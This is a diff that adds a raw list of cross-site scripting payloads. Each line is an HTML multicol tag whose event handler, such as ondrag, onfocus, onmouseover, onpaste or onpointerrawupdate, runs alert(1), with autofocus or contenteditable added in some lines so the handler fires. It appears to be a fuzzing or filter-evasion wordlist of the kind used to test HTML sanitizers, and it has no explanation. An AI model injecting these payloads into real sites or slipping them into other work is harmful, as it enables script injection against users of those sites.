@@ -1,0 +1,43 @@
+<multicol draggable="true" ondrag="alert(1)">test</multicol>
+<multicol draggable="true" ondragend="alert(1)">test</multicol>
+<multicol draggable="true" ondragenter="alert(1)">test</multicol>
+<multicol draggable="true" ondragleave="alert(1)">test</multicol>
+<multicol draggable="true" ondragstart="alert(1)">test</multicol>
+<multicol id=x tabindex=1 onactivate=alert(1)></multicol>
+<multicol id=x tabindex=1 onbeforeactivate=alert(1)></multicol>
+<multicol id=x tabindex=1 onbeforedeactivate=alert(1)></multicol><input autofocus>
+<multicol id=x tabindex=1 ondeactivate=alert(1)></multicol><input id=y autofocus>
+<multicol id=x tabindex=1 onfocus=alert(1)></multicol>
+<multicol id=x tabindex=1 onfocusin=alert(1)></multicol>
+<multicol onafterscriptexecute=alert(1)><script>1</script>
+<multicol onbeforecopy="alert(1)" contenteditable>test</multicol>
+<multicol onbeforecut="alert(1)" contenteditable>test</multicol>
+<multicol onbeforepaste="alert(1)" contenteditable>test</multicol>
+<multicol onbeforescriptexecute=alert(1)><script>1</script>
+<multicol onblur=alert(1) tabindex=1 id=x></multicol><input autofocus>
+<multicol onclick="alert(1)">test</multicol>
+<multicol oncontextmenu="alert(1)">test</multicol>
+<multicol oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<multicol oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<multicol ondblclick="alert(1)" autofocus tabindex=1>test</multicol>
+<multicol onfocusout=alert(1) tabindex=1 id=x></multicol><input autofocus>
+<multicol onkeydown="alert(1)" contenteditable>test</multicol>
+<multicol onkeypress="alert(1)" contenteditable>test</multicol>
+<multicol onkeyup="alert(1)" contenteditable>test</multicol>
+<multicol onmousedown="alert(1)">test</multicol>
+<multicol onmouseenter="alert(1)">test</multicol>
+<multicol onmouseleave="alert(1)">test</multicol>
+<multicol onmousemove="alert(1)">test</multicol>
+<multicol onmouseout="alert(1)">test</multicol>
+<multicol onmouseover="alert(1)">test</multicol>
+<multicol onmouseup="alert(1)">test</multicol>
+<multicol onmousewheel=alert(1)>requires scrolling
+<multicol onpaste="alert(1)" contenteditable>test</multicol>
+<multicol onpointerdown=alert(1)>XSS</multicol>
+<multicol onpointerenter=alert(1)>XSS</multicol>
+<multicol onpointerleave=alert(1)>XSS</multicol>
+<multicol onpointermove=alert(1)>XSS</multicol>
+<multicol onpointerout=alert(1)>XSS</multicol>
+<multicol onpointerover=alert(1)>XSS</multicol>
+<multicol onpointerrawupdate=alert(1)>XSS</multicol>
+<multicol onpointerup=alert(1)>XSS</multicol>
